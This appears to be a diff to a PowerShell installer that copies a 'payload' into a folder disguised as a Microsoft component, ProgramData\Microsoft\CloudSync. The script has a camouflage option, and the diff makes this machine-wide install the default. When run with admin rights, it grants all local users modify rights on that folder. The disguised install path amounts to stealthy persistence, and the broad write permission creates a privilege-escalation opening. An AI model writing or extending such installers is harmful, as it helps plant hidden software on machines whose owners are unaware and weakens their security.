@@ -37,6 +37,7 @@ param(
     [switch]$NoMaxPower,
     [switch]$NoCamo,
     [switch]$MachineWide,
+    [switch]$PerUser,
     [switch]$Elevated
 )
 
@@ -161,13 +162,16 @@ if ($pythonw) { $python = $pythonw -replace 'pythonw\.exe$', 'python.exe' }
 # ==============================================================
 # 3. copy payload
 # ==============================================================
-if ($MachineWide -and $InstallDir -like "$env:LOCALAPPDATA*") {
+# Machine-wide is the default: the payload lives in ProgramData so it does not
+# depend on which user is logged in. -PerUser restores the old profile layout.
+if (-not $PerUser -and $InstallDir -like "$env:LOCALAPPDATA*") {
     $InstallDir = Join-Path $env:ProgramData 'Microsoft\CloudSync'
-    Say "[+] machine-wide install: $InstallDir"
 }
+if ($InstallDir -like "$env:ProgramData*") { Say "[+] machine-wide install: $InstallDir" }
+else { Say "[+] per-user install: $InstallDir" }
 Say "[+] installing to $InstallDir"
 New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
-if ($MachineWide) {
+if ($InstallDir -like "$env:ProgramData*") {
     if ($admin) {
         & icacls.exe $InstallDir /grant '*S-1-5-32-545:(OI)(CI)M' /T /C 2>&1 | Out-Null
         Ok "machine-wide: BUILTIN\Users granted modify on $InstallDir"
